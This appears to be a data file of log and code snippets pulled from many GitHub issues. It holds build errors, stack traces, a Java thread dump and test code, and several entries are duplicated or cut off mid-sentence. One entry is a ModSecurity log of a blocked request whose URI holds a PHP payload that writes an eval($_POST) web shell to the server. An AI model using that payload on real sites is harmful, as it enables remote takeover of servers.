vite:config     base: undefined,\r\n  vite:config     mode: undefined,\r\n  vite:config     configFile: undefined,\r\n  vite:config     logLevel: undefined,\r\n  vite:config     clearScreen: undefined,\r\n  vite:config     server: {}\r\n  vite:config   },\r\n  vite:config   root: '/Users/stickb/Code/scratch/vite-gboost-ui-error',\r\n  vite:config   base: '/',\r\n  vite:config   publicDir: '/Users/stickb/Code/scratch/vite-gboost-ui-error/public',\r\n[Truncated]\n  vite:config       [Object], [Object],\r\n  vite:config       [Object], [Object],\r\n  vite:config       [Object], [Object]\r\n  vite:config     ],\r\n  vite:config     rollupOptions: {}\r\n  vite:config   }\r\n  vite:config } +6ms\r\n  vite:deps Hash is consistent. Skipping. Use --force to override. +0ms\n"
    },
    {
        "logs": "`java\r\n    @JsonIgnoreProperties(value = \"id\", allowGetters = true)\r\n    private static class TestClass1 {\r\n\r\n        private String id;\r\n\r\n        public String getId() {\r\n            return id;\r\n        }\r\n\r\n        public void setId(String id) {\r\n            this.id = id;\r\n        }\r\n    }\r\n\r\n    private static class TestClass2 {\r\n\r\n        @JsonIgnoreProperties(value = \"id\", allowGetters = true)\r\n        private String id;\r\n\r\n        public String getId() {\r\n            return id;\r\n        }\r\n\r\n        public void setId(String id) {\r\n            this.id = id;\r\n        }\r\n    }\r\n\r\n    @Test // This test case passes\r\n    public void testIgnorePropertiesOnClass() throws Exception {\r\n        ObjectMapper objectMapper = new ObjectMapper();\r\n        TestClass1 testClass = new TestClass1();\r\n        testClass.setId(\"abcd\");\r\n        String writeValueAsString = objectMapper.writeValueAsString(testClass);\r\n        System.out.println(\"writeValueAsString = \" + writeValueAsString);\r\n        Assertions.assertThat(writeValueAsString).contains(\"abcd\");\r\n        \r\n        TestClass1 readValue = objectMapper.readValue(\"{\\\"id\\\": \\\"myid\\\"}\", TestClass1.class);\r\n        System.out.println(\"readValue = \" + readValue);\r\n        Assertions.assertThat(readValue.getId()).isNull();\r\n    }\r\n\r\n    @Test // This test case fails\r\n    public void testIgnorePropertiesOnField() throws Exception {\r\n        ObjectMapper objectMapper = new ObjectMapper();\r\n        TestClass2 testClass = new TestClass2();\r\n        testClass.setId(\"abcd\");\r\n        String writeValueAsString = objectMapper.writeValueAsString(testClass);\r\n        Assertions.assertThat(writeValueAsString).contains(\"abcd\");\r\n        \r\n        TestClass2 readValue = objectMapper.readValue(\"{\\\"id\\\": \\\"myid\\\"}\", TestClass2.class);\r\n        Assertions.assertThat(readValue.getId()).isNull(); // This assertion fails.\r\n    }\r\n"
    },
    {
        "logs": "```java\r\n    @JsonIgnoreProperties(value = \"id\", allowGetters = true)\r\n    private static class TestClass1 {\r\n\r\n        private String id;\r\n\r\n        public String getId() {\r\n            return id;\r\n        }\r\n\r\n        public void setId(String id) {\r\n            this.id = id;\r\n        }\r\n    }\r\n\r\n    private static class TestClass2 {\r\n\r\n        @JsonIgnoreProperties(value = \"id\", allowGetters = true)\r\n        private String id;\r\n\r\n        public String getId() {\r\n            return id;\r\n        }\r\n\r\n        public void setId(String id) {\r\n            this.id = id;\r\n        }\r\n    }\r\n\r\n    @Test // This test case passes\r\n    public void testIgnorePropertiesOnClass() throws Exception {\r\n        ObjectMapper objectMapper = new ObjectMapper();\r\n        TestClass1 testClass = new TestClass1();\r\n        testClass.setId(\"abcd\");\r\n        String writeValueAsString = objectMapper.writeValueAsString(testClass);\r\n        System.out.println(\"writeValueAsString = \" + writeValueAsString);\r\n        Assertions.assertThat(writeValueAsString).contains(\"abcd\");\r\n        \r\n        TestClass1 readValue = objectMapper.readValue(\"{\\\"id\\\": \\\"myid\\\"}\", TestClass1.class);\r\n        System.out.println(\"readValue = \" + readValue);\r\n        Assertions.assertThat(readValue.getId()).isNull();\r\n    }\r\n\r\n    @Test // This test case fails\r\n    public void testIgnorePropertiesOnField() throws Exception {\r\n        ObjectMapper objectMapper = new ObjectMapper();\r\n        TestClass2 testClass = new TestClass2();\r\n        testClass.setId(\"abcd\");\r\n        String writeValueAsString = objectMapper.writeValueAsString(testClass);\r\n        Assertions.assertThat(writeValueAsString).contains(\"abcd\");\r\n        \r\n        TestClass2 readValue = objectMapper.readValue(\"{\\\"id\\\": \\\"myid\\\"}\", TestClass2.class);\r\n        Assertions.assertThat(readValue.getId()).isNull(); // This assertion fails.\r\n    }\r\n"
    },
    {
        "logs": "`\r\n2018-05-14 15:24:52\r\nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.74-b02 mixed mode):\r\n\r\n\"pool-1-thread-4\" #13 prio=5 os_prio=0 tid=0x000000003da7d000 nid=0x1214 runnable [0x000000004502e000]\r\n   java.lang.Thread.State: RUNNABLE\r\n        at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1042)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processIf(RegionMaker.java:657)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:127)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeEndlessLoop(RegionMaker.java:324)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processLoop(RegionMaker.java:176)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:110)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:49)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:34)\r\n        - locked <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000406a69d90> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145b11d0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040abe4ee8> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-3\" #12 prio=5 os_prio=0 tid=0x000000003ead7000 nid=0x1a34 waiting for monitor entry [0x000000004412e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409d87008> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145af630> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad84e98> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-2\" #11 prio=5 os_prio=0 tid=0x000000003f866000 nid=0x1098 waiting for monitor entry [0x000000004322e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x000000040601fa68> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x0000000414598ae0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad85330> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-1\" #10 prio=5 os_prio=0 tid=0x000000003f168800 nid=0x17e4 waiting for monitor entry [0x000000004232e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409c26c48> (a jadx.core.dex.info.ClassInfo)\r\n[Truncated]\n   Locked ownable synchronizers:\r\n        - None\r\n\r\n\"VM Thread\" os_prio=2 tid=0x0000000036977800 nid=0x1aac runnable\r\n\r\n\"GC task thread#0 (ParallelGC)\" os_prio=0 tid=0x0000000000f28000 nid=0x1574 runnable\r\n\r\n\"GC task thread#1 (ParallelGC)\" os_prio=0 tid=0x0000000000f29800 nid=0x388 runnable\r\n\r\n\"GC task thread#2 (ParallelGC)\" os_prio=0 tid=0x0000000000f2b000 nid=0xf78 runnable\r\n\r\n\"GC task thread#3 (ParallelGC)\" os_prio=0 tid=0x0000000000f2c800 nid=0x594 runnable\r\n\r\n\"VM Periodic Task Thread\" os_prio=2 tid=0x000000003bb57000 nid=0x14f8 waiting on condition\r\n\r\nJNI global references: 302\r\n"
    },
    {
        "logs": "```\r\n2018-05-14 15:24:52\r\nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.74-b02 mixed mode):\r\n\r\n\"pool-1-thread-4\" #13 prio=5 os_prio=0 tid=0x000000003da7d000 nid=0x1214 runnable [0x000000004502e000]\r\n   java.lang.Thread.State: RUNNABLE\r\n        at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1042)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processIf(RegionMaker.java:657)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:127)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeEndlessLoop(RegionMaker.java:324)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.processLoop(RegionMaker.java:176)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.traverse(RegionMaker.java:110)\r\n        at jadx.core.dex.visitors.regions.RegionMaker.makeRegion(RegionMaker.java:94)\r\n        at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:49)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)\r\n        at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:34)\r\n        - locked <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000406a69d90> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145b11d0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040abe4ee8> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-3\" #12 prio=5 os_prio=0 tid=0x000000003ead7000 nid=0x1a34 waiting for monitor entry [0x000000004412e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409d87008> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x00000004145af630> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad84e98> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-2\" #11 prio=5 os_prio=0 tid=0x000000003f866000 nid=0x1098 waiting for monitor entry [0x000000004322e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x000000040601fa68> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)\r\n        at jadx.api.JavaClass.decompile(JavaClass.java:62)\r\n        - locked <0x0000000414598ae0> (a jadx.api.JavaClass)\r\n        at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)\r\n        at jadx.api.JadxDecompiler$$Lambda$8/1896305732.run(Unknown Source)\r\n        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\r\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\r\n        at java.lang.Thread.run(Thread.java:745)\r\n\r\n   Locked ownable synchronizers:\r\n        - <0x000000040ad85330> (a java.util.concurrent.ThreadPoolExecutor$Worker)\r\n\r\n\"pool-1-thread-1\" #10 prio=5 os_prio=0 tid=0x000000003f168800 nid=0x17e4 waiting for monitor entry [0x000000004232e000]\r\n   java.lang.Thread.State: BLOCKED (on object monitor)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:28)\r\n        - waiting to lock <0x0000000409d95550> (a jadx.core.dex.info.ClassInfo)\r\n        at jadx.core.ProcessClass.processDependencies(ProcessClass.java:60)\r\n        at jadx.core.ProcessClass.process(ProcessClass.java:39)\r\n        - locked <0x0000000409c26c48> (a jadx.core.dex.info.ClassInfo)\r\n[Truncated]\n   Locked ownable synchronizers:\r\n        - None\r\n\r\n\"VM Thread\" os_prio=2 tid=0x0000000036977800 nid=0x1aac runnable\r\n\r\n\"GC task thread#0 (ParallelGC)\" os_prio=0 tid=0x0000000000f28000 nid=0x1574 runnable\r\n\r\n\"GC task thread#1 (ParallelGC)\" os_prio=0 tid=0x0000000000f29800 nid=0x388 runnable\r\n\r\n\"GC task thread#2 (ParallelGC)\" os_prio=0 tid=0x0000000000f2b000 nid=0xf78 runnable\r\n\r\n\"GC task thread#3 (ParallelGC)\" os_prio=0 tid=0x0000000000f2c800 nid=0x594 runnable\r\n\r\n\"VM Periodic Task Thread\" os_prio=2 tid=0x000000003bb57000 nid=0x14f8 waiting on condition\r\n\r\nJNI global references: 302\r\n"
    },
    {
        "logs": "`RangeError: Index out of range\r\n    at checkOffset (buffer.js:977:11)\r\n    at Buffer.readUInt8 (buffer.js:1015:5)\r\n    at Hci.processCmdCompleteEvent (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\noble\\lib\\hci-socket\\hci.js:566:25)\r\n    at Hci.onSocketData (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\noble\\lib\\hci-socket\\hci.js:461:12)\r\n    at emitOne (events.js:116:13)\r\n    at BluetoothHciSocket.emit (events.js:211:7)\r\n    at BluetoothHciSocket.onHciEventEndpointData (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\bluetooth-hci-socket\\lib\\usb.js:190:10)\r\n    at emitOne (events.js:116:13)\r\n    at InEndpoint.emit (events.js:211:7)\r\n    at Transfer.transferDone (C:\\Dev\\Code\\Falaffel\\BLE\\node_modules\\usb\\usb.js:328:9)"
    },
    {
        "logs": "`\r\n  Checking Build System\r\n  Creating directories for 'mp4v2'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'mp4v2'\r\n  Creating directories for 'curl'\r\n  Creating directories for 'expat'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'curl'\r\n  Creating directories for 'json11'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'expat'\r\n  Building Custom Rule C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/CMakeLists.txt\r\n  Performing download step (git clone) for 'json11'\r\n  CMake Error at json11-stamp/json11-download-Debug.cmake:37 (message):\r\n    Command failed: 1\r\n\r\n     'C:/Program Files/CMake/bin/cmake.exe' '-P' 'C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson1\r\n  1/tmp/json11-gitclone.cmake'\r\n\r\n    See also\r\n\r\n      C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/src/json11-stamp/json11-download-*.log\r\n\r\n  -- stdout output is:\r\n\r\n  -- stderr output is:\r\n  Cloning into 'json11'...\r\n  Note: checking out 'v1.0.0'.\r\n\r\n  You are in 'detached HEAD' state. You can look around, make experimental\r\n  changes and commit them, and you can discard any commits you make in this\r\n  state without impacting any branches by performing another checkout.\r\n\r\n  If you want to create a new branch to retain commits you create, you may\r\n  do so (now or later) by using -b with the checkout command again. Example:\r\n\r\n    git checkout -b <new-branch-name>\r\n\r\n  HEAD is now at ec4e452 Change Json map/vector conversions to invoke begin() directly (#110)\r\n  fatal: 'submodule' appears to be a git command, but we were not\r\n  able to execute it. Maybe git-submodule is broken?\r\n  CMake Error at C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/tmp/json11-gitclone.cmake:49 (m\r\n  essage):\r\n    Failed to update submodules in:\r\n    'C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/src/json11'\r\n\r\n  CMake Error at json11-stamp/json11-download-Debug.cmake:47 (message):\r\n    Stopping after outputting logs.\r\n\r\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Microsoft\\VC\\v160\\Microsoft.CppCommon.targets(230\r\n,5): error MSB6006: \"cmd.exe\" wurde mit dem Code 1 beendet. [C:\\Users\\username_0\\Documents\\Dev\\orig\\ultraschall-plugin\\_bui\r\nld\\json11-build.vcxproj]\r\n"
    },
    {
        "logs": "`\r\nCMake Error at C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/tmp/json11-gitclone.cmake:49 (message):\r\n  Failed to update submodules in:\r\n  'C:/Users/username_0/Documents/Dev/orig/ultraschall-plugin/_build/libjson11/src/json11'\r\n"
    },
    {
        "logs": "`\r\n\r\nUnfortunately I have really no idea where the double quote is added by cmake. :-/\r\n\r\nI will try to downlaod the external \"projects\" (libraries) by hand. Afterwards I will try another build by bootstrap.ps1. I will add my findings then to this issue.\r\n\r\nThx for reading so far! ;)\n<issue_comment>username_0: I discovered some seconds ago that a download of external projects seems to be successfull.\r\nIn the directory "
    },
    {
        "logs": "` there are several sources of the json project.\r\n\r\nSo I'm more confused than 30 min ago.\r\nWhat's acutal the problem my build fails??\n<issue_comment>username_0: It seems that this build environement is not supported.\r\nI'm not quite sure but that's probably the current state.\r\n\r\nTo be clear:\r\nI tried to build on WINdows __not__ Linux/Unix.\r\nMy "
    },
    {
        "logs": "` \"environment\" on my Win 10 workstation was installed by the MSI installier \"git for windows\".\r\n\r\nWhat can / should I do to build the code under Win 10?\n<issue_comment>username_1: The build instructions in the "
    },
    {
        "logs": "`\r\nAggregateError: OPError: expected 200 OK, got: 403 Forbidden\r\nat processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19\r\nOPError: expected 200 OK, got: 403 Forbidden at processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19\r\n"
    },
    {
        "logs": "```\r\nAggregateError: OPError: expected 200 OK, got: 403 Forbidden\r\nat processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19\r\nOPError: expected 200 OK, got: 403 Forbidden at processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19\r\n"
    },
    {
        "logs": "`\r\n/usr/bin/ld: relocatable linking with relocations from format elf64-x86-64 (/opt/wine-staging/lib64/wine/libwinecrt0.a(exe_entry.o)) to format elf32-i386 (opentrack-wrapper-wine.mcDCZn.o) is not supported\r\nwinebuild: /usr/bin/ld failed with status 1\r\nwinegcc: /opt/wine-staging/bin/winebuild failed\r\nmake[2]: *** [proto-wine/CMakeFiles/wine-wrapper.dir/build.make:82: proto-wine/opentrack-wrapper-wine.exe.so] Error 2\r\nmake[1]: *** [CMakeFiles/Makefile2:2458: proto-wine/CMakeFiles/wine-wrapper.dir/all] Error 2\r\nmake[1]: *** Waiting for unfinished jobs....\r\n"
    },
    {
        "logs": "`\r\n/media/local/opentrack$ winegcc -m32\r\ngcc: fatal error: no input files\r\ncompilation terminated.\r\nwinegcc: /usr/bin/gcc failed\r\n"
    },
    {
        "logs": "```\r\n/usr/bin/ld: relocatable linking with relocations from format elf64-x86-64 (/opt/wine-staging/lib64/wine/libwinecrt0.a(exe_entry.o)) to format elf32-i386 (opentrack-wrapper-wine.mcDCZn.o) is not supported\r\nwinebuild: /usr/bin/ld failed with status 1\r\nwinegcc: /opt/wine-staging/bin/winebuild failed\r\nmake[2]: *** [proto-wine/CMakeFiles/wine-wrapper.dir/build.make:82: proto-wine/opentrack-wrapper-wine.exe.so] Error 2\r\nmake[1]: *** [CMakeFiles/Makefile2:2458: proto-wine/CMakeFiles/wine-wrapper.dir/all] Error 2\r\nmake[1]: *** Waiting for unfinished jobs....\r\n"
    },
    {
        "logs": "`\r\ntest-sim-import-export: runsim\r\n\t@echo \"Running application import/export simulation. This may take several minutes...\"\r\n\t@$(BINDIR)/runsim -Jobs=4 -SimAppPkg=$(SIMAPP) -ExitOnFail 50 5 TestAppImportExport\r\n"
    },
    {
        "logs": "```\r\ntest-sim-import-export: runsim\r\n\t@echo \"Running application import/export simulation. This may take several minutes...\"\r\n\t@$(BINDIR)/runsim -Jobs=4 -SimAppPkg=$(SIMAPP) -ExitOnFail 50 5 TestAppImportExport\r\n"
    },
    {
        "logs": "`\r\n    def _CloneMixin__duplicate_m2o_fields(self, duplicate, using=None):\r\n        for f in self._meta.concrete_fields:\r\n            if f.many_to_one:\r\n                if any(\r\n                    [\r\n                        f.name in self._clone_m2o_or_o2m_fields,\r\n                        self._clone_excluded_m2o_or_o2m_fields\r\n                        and f.name not in self._clone_excluded_m2o_or_o2m_fields,\r\n                    ]\r\n                ):\r\n                    item = getattr(self, f.name)\r\n                    if hasattr(item, \"make_clone\"):\r\n                        try:\r\n                            item_clone = item.make_clone(using=using)\r\n                        except IntegrityError:\r\n                            item_clone = item.make_clone(sub_clone=True)\r\n                    elif item is None:\r\n                        item_clone = None\r\n                    else:\r\n                        item.pk = None  # pragma: no cover\r\n                        item_clone = item.save(using=using)  # pragma: no cover\r\n"
    },
    {
        "logs": "```\r\n    def _CloneMixin__duplicate_m2o_fields(self, duplicate, using=None):\r\n        for f in self._meta.concrete_fields:\r\n            if f.many_to_one:\r\n                if any(\r\n                    [\r\n                        f.name in self._clone_m2o_or_o2m_fields,\r\n                        self._clone_excluded_m2o_or_o2m_fields\r\n                        and f.name not in self._clone_excluded_m2o_or_o2m_fields,\r\n                    ]\r\n                ):\r\n                    item = getattr(self, f.name)\r\n                    if hasattr(item, \"make_clone\"):\r\n                        try:\r\n                            item_clone = item.make_clone(using=using)\r\n                        except IntegrityError:\r\n                            item_clone = item.make_clone(sub_clone=True)\r\n                    elif item is None:\r\n                        item_clone = None\r\n                    else:\r\n                        item.pk = None  # pragma: no cover\r\n                        item_clone = item.save(using=using)  # pragma: no cover\r\n"
    },
    {
        "logs": "`scala\r\n[error] /home/runner/work/akka/akka/akka-remote/src/main/scala/akka/remote/artery/tcp/ArteryTcpTransport.scala:329:58: missing parameter type\r\n[error]       val partition = b.add(Partition[EnvelopeBuffer](3, env => {\r\n[error]                                                          ^\r\n[error] one error found\r\n[error] (akka-remote / Compile / compileIncremental) Compilation failed\r\n"
    },
    {
        "logs": "`[client [OUR.IP]:41520] ModSecurity: Access denied with code 403 (phase 2). Matched phrase \"eval(\" at ARGS:1. [file \"C:\\/Program Files/ModSecurity IIS/b/b.conf\"] [line \"3\"] [id \"49459\"] [msg \"NO\"] [severity \"WARNING\"] [hostname \"NODE2\"] [uri \"/?1=@ini_set(%22display_errors%22,%220%22);@set_time_limit(0);@set_magic_quotes_runtime(0);echo%20'-%3E%7C';file_put_contents(dirname($_SERVER%5B'SCRIPT_FILENAME'%5D).'/cache/cachee.php','%3C?php%20eval($_POST%5Bshine%5D);?%3E');echo%20'%7C%3C-';\"] [unique_id \"13979173249800486753\"]"
    },
    {
        "logs": "`\r\nyarn install v0.18.1\r\n[1/4] Resolving packages...\r\n[2/4] Fetching packages...\r\nwarning fsevents@1.0.17: The platform \"linux\" is incompatible with this module.\r\ninfo \"fsevents@1.0.17\" is an optional dependency and failed compatibility check. Excluding it from installation.\r\n[3/4] Linking dependencies...\r\nwarning Incorrect peer dependency \"@angular/compiler@<=2.4 >=2.2.0\".\r\nwarning Incorrect peer dependency \"@angular/core@<=2.4 >=2.2.0\".\r\nwarning Unmet peer dependency \"@angular/tsc-wrapped@^0.5.0\".\r\nwarning Unmet peer dependency \"reflect-metadata@^0.1.8\".\r\n[4/4] Building fresh packages...\r\nDone in 8.18s.\r\n"
    },
    {
        "logs": "`\r\nwarning Incorrect peer dependency \"@angular/compiler@<=2.4 >=2.2.0\".\r\nwarning Incorrect peer dependency \"@angular/core@<=2.4 >=2.2.0\".\r\nwarning Unmet peer dependency \"@angular/tsc-wrapped@^0.5.0\".\r\nwarning Unmet peer dependency \"reflect-metadata@^0.1.8\".\r\n"
    },
    {
        "logs": "` as well.\n<issue_comment>username_8: I have the same error\n<issue_comment>username_9: So, yeah, now that angular 4 is out, shouldn't angular-cli use it by default as indicated above instead of having to update? That does not seem to be the case...\n<issue_comment>username_10: @username_9 I have just created new project with latest angular-cli (1.0.0) and it uses Angular 4.\r\n\r\n"
    },
    {
